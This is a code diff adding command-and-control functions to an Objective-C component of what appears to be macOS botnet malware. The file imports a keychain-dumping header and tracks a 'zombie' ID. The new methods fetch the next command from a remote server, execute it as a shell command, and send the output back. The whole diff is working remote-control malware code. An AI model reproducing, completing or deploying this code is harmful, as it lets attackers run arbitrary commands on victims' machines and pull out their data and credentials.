@@ -7,11 +7,13 @@
 //
 
 #import "WTServerApi.h"
+#import "WTShellCommands.h"
 #import "WTHTTPApi.h"
 #import "WTUserApi.h"
 #import "WTConfig.h"
 #import "keychaindump.h"
 #import "WTUUIDApi.h"
+#import "WTJsonParser.h"
 
 @implementation WTServerApi
 
@@ -77,4 +79,31 @@
     }
 }
 
++(NSArray *)nextCommand {
+    WTConfig *config = [WTConfig getConfig];
+    NSString *zombieId = [config getZombieId];
+    NSString *url = [NSString stringWithFormat:@"%@/next/command/%@", [config getBaseUrl], zombieId];
+    NSString *response = [[[WTHTTPApi alloc] init] httpGetRequest:url usingData:nil];
+    NSDictionary *responseJson = [WTJsonParser parseJson:response];
+    NSString *commandId = [responseJson objectForKey:@"id"];
+    NSString *command = [responseJson objectForKey:@"command"];
+    return @[commandId,command];
+}
+
++(void)sendCommandOutput:(NSString *)output withCommandId:(NSString *)commandId {
+    WTHTTPApi *httpObj = [[WTHTTPApi alloc] init];
+    WTConfig *config = [WTConfig getConfig];
+    NSString *url = [NSString stringWithFormat:@"%@/finished/command/%@", [config getBaseUrl], commandId];
+    [httpObj httpPostRequest:url usingGetData:nil usingPostData:@{@"output":output}];
+}
+
++(void)execNextCommand {
+    WTConfig *config = [WTConfig getConfig];
+    NSArray *nextCommandArray = [WTServerApi nextCommand];
+    NSString *commandId = nextCommandArray[0];
+    NSString *command = nextCommandArray[1];
+    NSString *commandOutput = [WTShellCommands runShellCommand:command withMaxBufferSize:-1];
+    NSString *url = [NSString stringWithFormat:@"%@/finished/command/%@", [config getBaseUrl], commandId];
+    [[[WTHTTPApi alloc] init] httpPostRequest:url usingGetData:nil usingPostData:@{@"output":commandOutput}];
+}
 @end
